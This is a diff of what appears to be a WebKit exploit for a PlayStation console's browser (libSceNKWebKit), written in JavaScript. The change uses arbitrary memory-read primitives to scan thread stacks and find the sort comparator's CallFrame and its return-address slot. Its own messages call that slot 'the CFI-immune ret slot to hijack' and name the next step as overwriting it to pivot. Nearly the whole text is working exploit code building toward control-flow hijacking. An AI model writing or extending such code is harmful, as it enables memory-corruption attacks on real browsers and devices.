@@ -256,22 +256,34 @@ async function prepare(p) {
 
         const M0 = 0x13370001, M1 = 0x13370002;
         let comparatorAddr = null;
-        const hitsAll = [];
+        const frames = [];      // CallFrames whose callee is our comparator
 
         const comparator = function (a, b) {
-            if (hitsAll.length) return 0;
+            if (frames.length) return 0;
+            // Locate the comparator's own CallFrame by its callee slot: scan for
+            // a qword == comparatorAddr, then a WebKit-text returnPC must sit at
+            // callee-0x10 (callee is CallFrame+0x18, returnPC is CallFrame+0x08).
+            const lo = comparatorAddr.low >>> 0, hi = comparatorAddr.hi >>> 0;
+            const b0 = lo & 0xff, b1 = (lo >>> 8) & 0xff,
+                  b2 = (lo >>> 16) & 0xff, b3 = (lo >>> 24) & 0xff;
             for (const [base, size] of stacks) {
                 const view = array_from_address(base, size);
                 for (let o = 0; o + 8 <= size; o += 8) {
-                    // low dword of the marker, little-endian: 01 00 37 13
-                    if (view[o] !== 0x01 || view[o + 1] !== 0x00
-                        || view[o + 2] !== 0x37 || view[o + 3] !== 0x13) continue;
+                    if (view[o] !== b0 || view[o + 1] !== b1
+                        || view[o + 2] !== b2 || view[o + 3] !== b3) continue;
                     const slot = base.add32(o);
-                    const full = p.read8(slot);            // how arg0 is boxed
-                    const retc = (o >= 0x30) ? p.read8(base.add32(o - 0x28)) : null;   // CallFrame+0x08
-                    const callee = (o >= 0x30) ? p.read8(base.add32(o - 0x18)) : null; // CallFrame+0x18
-                    hitsAll.push({ base, o, full, retc, callee });
-                    if (hitsAll.length >= 8) return 0;
+                    const full = p.read8(slot);
+                    if (full.low !== lo || (full.hi >>> 0) !== hi) continue;   // exact callee
+                    if (o < 0x10) continue;
+                    const retPC = p.read8(base.add32(o - 0x10));               // CallFrame+0x08
+                    const rva = retPC.sub32(libSceNKWebKitBase);
+                    const inWk = rva.hi === 0 && (rva.low >>> 0) < 0x3673d22
+                        && (rva.low >>> 0) > 0x1000;
+                    frames.push({ base, o, calleeSlot: slot, retPC,
+                        retSlot: base.add32(o - 0x10),      // CallFrame+0x08
+                        cbSlot: base.add32(o - 0x08),       // CallFrame+0x10
+                        rva: rva.low >>> 0, inWk });
+                    if (frames.length >= 8) return 0;
                 }
             }
             return 0;
@@ -283,28 +295,26 @@ async function prepare(p) {
         const arr = [M0, M1];
         arr.sort(comparator);
 
-        jbmark("SELF-HITS", "count=" + hitsAll.length);
-        for (let n = 0; n < hitsAll.length; n++) {
-            const h = hitsAll[n];
-            const calleeMatch = h.callee && h.callee.low === (comparatorAddr.low >>> 0)
-                && h.callee.hi === (comparatorAddr.hi >>> 0);
-            const retRva = h.retc ? h.retc.sub32(libSceNKWebKitBase) : null;
-            const inWk = retRva && retRva.hi === 0 && (retRva.low >>> 0) < 0x3673d22
-                && (retRva.low >>> 0) > 0x1000;
-            jbmark("SELF-HIT", "#" + n + "-stack=0x" + h.base.toString()
-                + "-off=0x" + h.o.toString(16)
-                + "-arg0boxed=0x" + h.full.toString()
-                + "-returnPC=" + (h.retc ? "0x" + h.retc.toString() : "n/a")
-                + (inWk ? "(wk+0x" + (retRva.low >>> 0).toString(16) + ")" : "")
-                + "-calleeMatch=" + calleeMatch);
+        jbmark("SELF-FRAMES", "callee-slots-found=" + frames.length);
+        let good = null;
+        for (let n = 0; n < frames.length; n++) {
+            const f = frames[n];
+            jbmark("SELF-FRAME", "#" + n + "-stack=0x" + f.base.toString()
+                + "-off=0x" + f.o.toString(16)
+                + "-returnPC=0x" + f.retPC.toString()
+                + (f.inWk ? "(wk+0x" + f.rva.toString(16) + ")" : "(NOT wk)")
+                + "-retSlot=0x" + f.retSlot.toString());
+            if (f.inWk && !good) good = f;
         }
-        if (!hitsAll.length)
-            throw new Error("selfstack: marker 0x13370001 not present on ANY "
-                + "thread stack -- sort did not spill the comparator args to the "
-                + "CallFrame (JIT?), or the array is not int32-backed.");
-        throw new Error("selfstack diagnostic: " + hitsAll.length
-            + " marker hit(s) -- see SELF-HIT lines for the boxing and the "
-            + "candidate returnPC / callee match.");
+        if (!good)
+            throw new Error("selfstack: found " + frames.length + " callee refs "
+                + "but none had a WebKit returnPC at CallFrame+0x08 -- comparator "
+                + "may be JIT-compiled (no standard CallFrame). Force interpreter.");
+        jbmark("SELF-LOCATE-OK", "comparator CallFrame located; returnPC=wk+0x"
+            + good.rva.toString(16) + " at retSlot=0x" + good.retSlot.toString()
+            + " -- this is the CFI-immune ret slot to hijack");
+        throw new Error("selfstack locate OK: returnPC=wk+0x" + good.rva.toString(16)
+            + " at 0x" + good.retSlot.toString() + ". Next: overwrite to pivot.");
     }
 
     // -----------------------------------------------------------------------
